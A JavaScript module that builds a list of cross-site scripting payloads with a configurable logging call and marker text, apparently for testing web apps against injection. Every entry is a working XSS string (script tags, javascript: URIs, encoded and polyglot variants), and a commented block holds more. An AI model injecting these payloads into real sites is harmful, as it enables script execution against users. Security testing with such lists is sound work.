
const entities = require('he');

module.exports = function(options) {
  const {
    fn = 'console.error',
    getPayloadMessage = n => `XSSPayload${n}`
  } = options;

  return [
      '>"><script>' + fn + '("' + getPayloadMessage(1) + '")</script>&',

      '"><STYLE>@import"javascript:' + fn + '(\'' + getPayloadMessage(2) + '\')";</STYLE>',

      ' alert(%26quot;%26%23x20;' + getPayloadMessage(3) + '%26quot;)>',

      '>%22%27><img%20src%3d%22javascript:' + fn + '(%27%20' + getPayloadMessage(4) + '%27)%22>',

      `'%uff1cscript%uff1e'` + fn + `'('` + getPayloadMessage(5) + `')%uff1c/script%uff1e'
      ">
      >" `,

      '\'\';!--"<' + getPayloadMessage(6) + '>=&{()}',

      '<IMG SRC="javascript:' + fn + '(\'' + getPayloadMessage(7) + '\');">',

      '<IMG SRC=javascript:' + fn + '(\'' + getPayloadMessage(8) + '\')>',

      '<IMG SRC=JaVaScRiPt:' + fn + '(\'' + getPayloadMessage(9) + '\')> ',

      '<IMG SRC=JaVaScRiPt:' + fn + '(&quot;' + getPayloadMessage(10) + '<WBR>&quot;)>',

      '<IMG SRC="jav&#x09;ascript:' + fn + '(<WBR>\'' + getPayloadMessage(11) + '\');">',

      '<IMG SRC="jav&#x0A;ascript:' + fn + '(<WBR>\'' + getPayloadMessage(12) + '\');">',

      '<IMG SRC="jav&#x0D;ascript:' + fn + '(<WBR>\'' + getPayloadMessage(13) + '\');">',

      'js4%22,x:' + fn + '%28%22' + getPayloadMessage(14) + '%22%29,y:%22',

      '>"\'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;' +
      encodeURIComponent(entities.encode(fn + '("' + getPayloadMessage(15)  + '")', {encodeEverything: true})),

      "<IMG SRC='x' onerror='javascript:console.error(&quot;" + getPayloadMessage(16) + "&quot;);'>",

      "jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=" + fn + "('" + getPayloadMessage(17) + "') )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=" + fn + "('" + getPayloadMessage(17) + "')//&gt;\x3e",

      'jaVasCript:/*-/*`/*\`/*&apos;/*"/**/(/* */oNcliCk=' + fn + '("' + getPayloadMessage(18) +'") )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=' + fn + '("' + getPayloadMessage(18) + '")//>\x3e',

      "jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=" + fn + "(%27" + getPayloadMessage(19) + "%27)%20)//%0D%0A%0d%0a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%5Cx3csVg/%3CsVg/oNloAd=" + fn + "(%27" + getPayloadMessage(19) + "%27)//%3E%5Cx3e",

      "jaVasCript:/*-/*`/*\`/*'/*&quot;/**/(/* */oNcliCk=" + fn + "('" + getPayloadMessage(20) + "') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=" + fn + "('" + getPayloadMessage(20) + "')//>\x3e",

      // TODO: incorporate fn & getPayloadMessage commands into these payloads:
      // `<IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;
      //  &#108;&#101;&<WBR>#114;&#116;&#40;&#39;&#88;&#83<WBR>;&#83;&#39;&#41>`,
      //
      // `<IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116&#0000058
      // &<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041>`,
      //
      // `<IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74&#x28
      // &<WBR>#x27&#x58&#x53&#x53&#x27&#x29>`,
  ];
};
